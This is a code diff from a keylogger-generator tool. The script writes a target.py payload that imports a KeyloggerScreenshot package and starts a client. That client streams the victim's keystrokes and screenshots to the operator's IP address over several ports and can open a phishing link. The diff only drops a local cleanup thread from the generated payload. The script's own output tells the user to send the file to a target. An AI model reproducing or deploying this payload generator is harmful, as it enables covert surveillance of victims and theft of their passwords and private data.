@@ -234,12 +234,12 @@ threading_server4.start() '''
                     if phishing_name is not None: print(f'LINK: {phishing_name} WILL BE OPEND WHEN {filename} IS EXECUTED')
 
                     with open(f"{filename}", "a+") as file:
-                        file.write(f"import KeyloggerScreenshot as ks \nimport threading\n\nthread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)\nthread_deleter.start()\n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
+                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
                     print(f"{filename.upper()} has been created")
 
                 except IndexError:
                     with open("target.py", "a+") as file:
-                        file.write(f"import KeyloggerScreenshot as ks \nimport threading\n\nthread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)\nthread_deleter.start()\n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
+                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
                     print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")
 
             server_photos = ks.ServerPhotos(ipaddress, port_photos)
